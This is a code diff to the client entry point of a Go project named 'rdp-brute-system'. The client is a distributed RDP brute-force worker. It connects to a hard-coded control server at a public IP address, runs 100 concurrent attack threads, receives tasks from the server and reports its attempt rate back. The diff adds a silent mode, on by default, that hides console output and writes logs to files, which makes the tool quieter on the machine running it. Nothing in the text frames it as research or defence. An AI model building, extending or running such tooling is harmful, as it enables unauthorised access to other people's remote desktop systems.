@@ -2,8 +2,6 @@ package main
 
 import (
 	"flag"
-	"fmt"
-	"log"
 	"os"
 	"os/signal"
 	"syscall"
@@ -12,13 +10,21 @@ import (
 	"rdp-brute-system/client/comm"
 	"rdp-brute-system/client/rdp"
 	"rdp-brute-system/client/worker"
+	"rdp-brute-system/shared/logger"
 	"rdp-brute-system/shared/protocol"
 )
 
 func main() {
 	serverAddr := flag.String("server", "195.189.96.174:8080", "Address of the control server")
 	numThreads := flag.Int("threads", 100, "Number of concurrent threads")
+	silent := flag.Bool("silent", true, "Run in silent mode (no console output)")
+	logDir := flag.String("logdir", "./logs", "Directory for log files")
 	flag.Parse()
+
+	// Initialize logging system
+	if err := logger.InitializeLoggers(*logDir, *silent); err != nil {
+		os.Exit(1)
+	}
 
 	taskQueue := make(chan protocol.Task, *numThreads)
 	resultQueue := make(chan rdp.Result, *numThreads)
@@ -28,31 +34,40 @@ func main() {
 
 	clientComm, err := comm.New(*serverAddr, taskQueue, resultQueue)
 	if err != nil {
-		log.Fatalf("Failed to connect to server: %v", err)
+		logger.ClientLogger.Fatal("Failed to connect to server", map[string]interface{}{
+			"server": *serverAddr,
+			"error":  err.Error(),
+		})
 	}
 	go clientComm.Start()
 
-	fmt.Println("Client started. Press Ctrl+C to exit.")
+	logger.ClientLogger.Info("Client started successfully", map[string]interface{}{
+		"server":  *serverAddr,
+		"threads": *numThreads,
+		"silent":  *silent,
+	})
 
 	// Handle graceful shutdown
 	sigChan := make(chan os.Signal, 1)
 	signal.Notify(sigChan, syscall.SIGINT, syscall.SIGTERM)
 
-	// Monitor and report PPS
+	// Monitor and report PPS (background only)
 	go func() {
 		for {
 			time.Sleep(5 * time.Second)
 			pps := clientWorker.GetPPS()
-			fmt.Printf("Current PPS: %d\n", pps)
+			logger.ClientLogger.Performance("Performance update", map[string]interface{}{
+				"pps": pps,
+			})
 			clientComm.SendStatus(pps)
 		}
 	}()
 
 	<-sigChan
 
-	fmt.Println("Shutting down...")
+	logger.ClientLogger.Info("Shutdown signal received, stopping client")
 	close(taskQueue)
 	clientWorker.Stop()
 	clientComm.Stop()
-	fmt.Println("Client shut down gracefully.")
+	logger.ClientLogger.Info("Client shut down gracefully")
 }
